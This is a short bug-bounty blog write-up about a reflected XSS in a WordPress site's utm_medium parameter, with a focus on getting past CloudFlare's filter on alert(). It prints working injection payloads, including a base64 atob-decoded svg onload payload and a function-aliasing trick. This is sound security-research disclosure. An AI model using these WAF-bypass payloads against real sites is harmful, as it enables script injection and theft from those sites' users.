---
layout: post
title:  "Popping XSS on a website behind CloudFlare"
date:   2020-11-08
categories: CTF
thumbnail: /img/rude.png
tags: cloudflare,xss-bypass
---
Few days ago I encountered this interesting reflected XSS on a private program. Decided to drop a short writeup because it was fun to exploit.

I came across this `utm_medium` GET parameter that gets reflected on 404 pages of the website and the website was running WordPress:

```html
<script>(function (c, p, d, u, id, i) {
          id = '{REFLECTED_VALUE}_494946e30b60c7d85f47556fafff8903'; // Optional Custom ID for user in your system
          u = 'https://www.g2crowd.com/attribution_tracking/conversions/' + c + '.js?p=' + encodeURI(p) + '&e=' + id;
          i = document.createElement('script');
          i.type = 'application/javascript';
          i.src = u;
          d.getElementsByTagName('head')[0].appendChild(i);
        }("71", document.location.href, document));</script>
</script>
```

I could easily break out of the apostrophe and comment out rest of the line by setting the `utm_medium` parameter value to `'; XSS ;//`. 

Seeing there was no filter in place I immediately added `alert(1)` to see this simple numeric value pop-up and have my satisfaction but I got rudely interrupted by this warning message of CloudFlare:

![CloudFlare-Block](/img/rude.png#center)

alert()/confirm()/prompt() pretty much all of them were blocked, the first bypass that I came up with was this:

```
1';document.body.innerHTML%3Datob('PHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4K');//
```

The base64 string gets decoded into `<svg/onload=alert(document.domain)>` and then inserted to body which triggers the XSS.

This was cool and all but we can do better! How about this?

```
1';ツ=alert;ツ(document.domain);//
```

This looks much cleaner and instantly got the alert box I was waiting for! 

That was it for this one, hope you found it interesting as well and catch you on the next one!